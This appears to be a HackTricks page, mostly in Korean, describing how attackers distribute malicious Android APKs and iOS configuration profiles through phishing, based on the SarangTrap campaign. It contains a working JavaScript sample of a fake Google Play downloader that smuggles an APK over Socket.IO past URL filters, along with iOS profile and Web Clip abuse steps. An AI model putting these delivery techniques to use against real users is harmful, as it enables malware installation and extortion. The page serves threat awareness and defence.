# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지는 threat actors가 phishing(SEO, social engineering, fake stores, dating apps, etc.)을 통해 **malicious Android APKs**와 **iOS mobile-configuration profiles**를 배포하는 데 사용하는 techniques를 다룹니다.
> 이 자료는 Zimperium zLabs(2025)가 공개한 SarangTrap campaign과 기타 공개 research를 기반으로 수정되었습니다.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* 수십 개의 look-alike domains(dating, cloud share, car service…)을 등록합니다.
– Google에서 순위를 올리기 위해 `<title>` element에 local language keywords와 emojis를 사용합니다.
– 같은 landing page에서 Android(`.apk`)와 iOS install instructions를 *모두* 호스팅합니다.
2. **First Stage Download**
* Android: 서명되지 않은 *unsigned* APK 또는 “third-party store”로 연결되는 direct link.
* iOS: 악성 **mobileconfig** profile로 연결되는 `itms-services://` 또는 plain HTTPS link (아래 참조).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection, 그리고 기타 post-install malware behaviour는 아래의 전용 Android Malware Post-Exploitation page에서 다룹니다.
4. **iOS Delivery Technique**
* 단일 **mobile-configuration profile**은 기기를 “MDM”-like supervision에 등록하기 위해 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등을 요청할 수 있습니다.
* Social-engineering instructions:
1. Settings ➜ *Profile downloaded*를 엽니다.
2. *Install*을 세 번 탭합니다(피싱 페이지의 screenshots).
3. 서명되지 않은 profile을 Trust하면 ➜ attacker는 App Store review 없이 *Contacts* 및 *Photo* entitlement를 획득합니다.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload는 **브랜딩된 icon/label과 함께 phishing URL을 Home Screen에 고정**할 수 있습니다.
* Web Clips는 **full‑screen**으로 실행될 수 있고(browser UI를 숨김), **non‑removable**로 표시될 수 있어, victim이 icon을 제거하려면 profile을 삭제해야 합니다.
6. **Network Layer**
* Plain HTTP, 보통 port 80에서 HOST header가 `api.<phishingdomain>.com` 같은 형태로 사용됩니다.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS 없음 → 쉽게 식별 가능).

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS, persistence 같은 post-install Android malware tradecraft는 아래를 참조하세요:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers는 정적 APK link 대신 Google Play처럼 보이는 lure에 내장된 Socket.IO/WebSocket channel을 점점 더 많이 사용합니다. 이는 payload URL을 숨기고, URL/extension filters를 우회하며, 실제와 유사한 install UX를 유지합니다.

wild에서 관찰된 일반적인 client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

왜 간단한 controls를 우회하는가:
- static APK URL이 노출되지 않으며; payload는 WebSocket frames에서 memory 내에서 재구성된다.
- direct .apk responses를 차단하는 URL/MIME/extension filters가 WebSockets/Socket.IO를 통해 tunneled된 binary data는 놓칠 수 있다.
- WebSockets를 실행하지 않는 crawlers와 URL sandboxes는 payload를 retrieve하지 못한다.

WebSocket tradecraft와 tooling도 참고:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
